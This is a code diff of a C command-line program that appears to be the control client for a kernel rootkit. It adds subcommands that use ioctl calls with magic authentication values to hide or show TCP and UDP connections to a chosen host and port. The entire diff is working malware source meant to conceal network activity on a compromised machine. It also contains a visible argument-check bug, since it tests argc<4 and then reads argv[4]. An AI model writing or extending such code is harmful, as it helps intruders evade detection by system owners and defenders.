@@ -106,7 +106,7 @@ int main(int argc, char **argv)
 		}
 	}
 
-	if (strcmp(argv[1], "conn") == 0) {
+	if (strcmp(argv[1], "tcp") == 0) {
 		if (argc < 4)
 			goto fail;
 
@@ -114,6 +114,41 @@ int main(int argc, char **argv)
 			args.cmd = 4;
 		} else if (strcmp(argv[4], "show") == 0) {
 			args.cmd = 5;
+		} else {
+			goto fail;
+		}
+
+		host = gethostbyname(argv[2]);
+
+		if (host == NULL)
+			goto fail;
+
+		memcpy((void *)&addr.sin_addr, (void *)host->h_addr,
+		       host->h_length);
+
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(atoi(argv[3]));
+
+		args.argv = &addr;
+
+		if (ioctl(sockfd, AUTH, HTUA) == 0) {
+			if (ioctl(sockfd, AUTH, &args) == 0) {
+				if (ioctl(sockfd, AUTH, HTUA) == 0) {
+					printf("\e[01;32mSuccess!\e[00m\n");
+					goto out;
+				}
+			}
+		}
+	}
+
+	if (strcmp(argv[1], "udp") == 0) {
+		if (argc < 4)
+			goto fail;
+
+		if (strcmp(argv[4], "hide") == 0) {
+			args.cmd = 6;
+		} else if (strcmp(argv[4], "show") == 0) {
+			args.cmd = 7;
 		} else {
 			goto fail;
 		}
